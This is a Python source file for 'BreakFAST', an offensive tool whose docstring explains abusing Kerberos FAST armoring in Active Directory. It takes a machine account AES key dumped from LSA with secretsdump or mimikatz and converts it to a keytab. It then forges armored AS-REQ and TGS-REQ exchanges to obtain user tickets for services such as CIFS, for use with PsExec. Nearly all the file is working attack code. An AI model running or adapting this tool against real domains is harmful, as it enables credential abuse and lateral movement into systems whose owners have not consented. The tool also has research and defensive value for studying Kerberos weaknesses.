"""
Usage: 
------
    
    ./BreakFAST.py -key <key> -machine <machine> [-outfile <.ccache>] [-spn <SPN>] identity

Details:
--------

    This tool demonstrates how to abuse Kerberos FAST armoring. When enabled, the KDC doesnt
    force FAST armoring on machine account AS-REQ. Thus, it is possible to request an armor
    TGT for a given machine principal if the associated long term secret (aesKey) is known. 
    This armor TGT can then be used for armoring TGS-REQ, e.g. CIFS\someHost to get a session 
    from a non domain-joined system, as demonstrated in this tool.  

Prerequisites:
--------------

    BreakFAST takes -aesKey as input, which is obtained by dumping LSA on the armorPrincipal system
    (or the Domain Controller, less likely). You must also know the password or other credential for 
    the user account you wish to impersonate. This script only helps you forge RFC-Compliant FAST.

References:
-----------

    Recover AES-Key:
        https://github.com/fortra/impacket/blob/master/examples/secretsdump.py

    FAST Armoring : 
        https://www.rfc-editor.org/rfc/rfc6113.txt

    Krb5 FAST: 
        https://github.com/jborean93/krb5-fast

    SecretsToKeytab:
        https://github.com/DovidP/generate-keytab/tree/master


Overview:
---------

    1. Convert aesKey to keytab (can be obtained running secretsdump)                    
    2. Build FAST AS-REQ using keytab as armor key, receive machine$ TGT                        
    3. Build FAST AS-REQ for user using machine$ TGT as armor key, receive user TGT
    4. Build FAST TGS-REQ using machine$ TGT for CIFS\fqdn, receive FAST ST for user
    5. Use ST for PsExec    
        
"""

import struct
from time import time
from dataclasses import astuple, dataclass
import argparse
import sys
import tempfile

from impacket.examples.utils import parse_identity 

import copy
import krb5
import gssapi
import gssapi.raw


def data_bytes(data):
    return struct.pack(f'>h{len(data)}s', len(data), bytes(data, 'ascii'))

@dataclass
class Principal:
    count_of_components: int = 1
    realm: bytes = None
    component: bytes = None
    name_type: int = 1

    def packed(self):
        return struct.pack(f'>h{len(self.realm)}s{len(self.component)}sl', *astuple(self))


@dataclass
class Entry:
    principal: bytes = None
    timestamp: int = int(time())
    key_version1: int = 1
    enctype: int = None
    key_length: int = None
    key_contents: bytes = None
    key_version2: int = 1

    def packed(self):
        packed_entry = struct.pack(f'>{len(self.principal)}sibhh{self.key_length}sl', *astuple(self))
        return struct.pack('>l{}s'.format(len(packed_entry)), len(packed_entry), packed_entry)


def ConvertKeyToKeyTab(machine, key, realm):
    etype = 18 # todo: add other formats, see refs.
    key = bytes.fromhex(key)
    principal = Principal(realm = data_bytes(realm), component = data_bytes(machine))
    entry = Entry()
    entry.principal = principal.packed()
    entry.enctype = etype
    entry.key_length = len(key)
    entry.key_contents = key
    version = b'\x05\x02'
    with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.keytab') as f:
        f.write(version + entry.packed())
        fpath = f.name

    return fpath

def GetFASTArmor(realm, username, passw, keytab, outfile):

    ctx = krb5.init_context()
    
    armour_kt = krb5.kt_resolve(ctx, f"FILE:{keytab}".encode('utf-8'))
    armour_kt_entry = list(armour_kt)[0]
    armour_princ = copy.copy(armour_kt_entry.principal)
    
    init_opt = krb5.get_init_creds_opt_alloc(ctx)
    armour_cred = krb5.get_init_creds_keytab(ctx, armour_princ, init_opt, keytab=armour_kt)
    armour_cc = krb5.cc_new_unique(ctx, b"MEMORY")
    
    krb5.cc_initialize(ctx, armour_cc, armour_princ)
    krb5.cc_store_cred(ctx, armour_cc, armour_cred)
    
    s = username+"@"+realm.upper()
    princ = krb5.parse_name_flags(ctx, s.encode('utf-8'))
    init_opt = krb5.get_init_creds_opt_alloc(ctx)
    
    krb5.get_init_creds_opt_set_canonicalize(init_opt, True)
    krb5.get_init_creds_opt_set_fast_flags(ctx, init_opt, krb5.FastFlags.required)
    krb5.get_init_creds_opt_set_fast_ccache(ctx, init_opt, armour_cc)
    cred = krb5.get_init_creds_password(ctx, princ, init_opt, password=passw.encode('utf-8'))
    
    print('\n'+"---"*10)
    print(f"[*] Received FAST TGT")
    
    tgt = krb5.cc_resolve(ctx, f"FILE:{outfile}".encode())
    krb5.cc_initialize(ctx, tgt, princ)
    krb5.cc_store_cred(ctx, tgt, cred)
    
    print(f"[*] Saved FAST TGT to {outfile}")
    return tgt


def GetFASTSt(realm, username, tgt, machine, spn, outfile):
    
    kerberos = gssapi.OID.from_int_seq("1.2.840.113554.1.2.2")
    s = username+"@"+realm.upper()
    kerb_user = gssapi.Name(s, name_type=gssapi.NameType.user)
    
    ccache_name = tgt.name or b""
    if tgt.cache_type:
        ccache_name = tgt.cache_type + b":" + ccache_name
    
    gssapi_cred = gssapi.raw.acquire_cred_from(
        {b"ccache": ccache_name},
        name=kerb_user,
        mechs=[kerberos],
        usage="initiate",
    ).creds
    
    cifs_ctx = gssapi.SecurityContext(
        creds=gssapi_cred,
        usage="initiate",
        name=gssapi.Name(spn, name_type=gssapi.NameType.hostbased_service),
        mech=kerberos,
    )
    print(f"[*] Received FAST ST")
    
    token = cifs_ctx.step()
    print(f"[*] Saved FAST ST for {spn} to {outfile}")


def main():

    # Usage: BreakFAST.py -key <key> -machine <machine> [-outfile <.ccache>] [-spn <SPN>] identity
    # -key : machine account key, retrieved using secretsdump or mimikatz
    # -machine: machine account the key belongs to, with $ at the end
    # [option] -outfile: name for .ccache where ticket will be saved
    # [option] -spn: service principal name, will trigger FAST TGS-REQ and .ccache will contain the ST
    # identity: identity for which TGT/TGS will be requested
    # Default : emit FAST AS-REQ for identity under machine, obtain TGT for this identity

    parser = argparse.ArgumentParser(description="BreakFAST - Forge FAST Armoring AS-REQ/TGS-REQs")
    parser.add_argument("-key", help="ekey for machine account", required=True)
    parser.add_argument("-machine", help="machine account for armor TGT", required=True)
    parser.add_argument("-outfile", help=".ccache file to save TGT/ST")
    parser.add_argument("-spn", help="request a TGS for the given SPN")
    parser.add_argument('identity', help='REALM/username:password')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()
    key = args.key
    machine = args.machine
    
    if machine[-1] != "$":
        machine += "$"

    if args.outfile:
        outfile = args.outfile
    elif args.spn:
        outfile = 'ST_BreakFAST.ccache'
    else:
        outfile = 'TGT_BreakFAST.ccache'
    
    realm, username, password, _, _, _ = parse_identity(args.identity)

    keytab = ConvertKeyToKeyTab(machine, key, realm)
    tgt = GetFASTArmor(realm, username, password, keytab, outfile)
    if args.spn is not None:
        spn = args.spn
        GetFASTSt(realm, username, tgt, machine, spn, outfile) 

    print("---"*10)
    print(f"[*] Use with: \texport KRB5CCNAME={outfile}")
    print("---"*10+'\n')

if __name__ == '__main__':
    main()
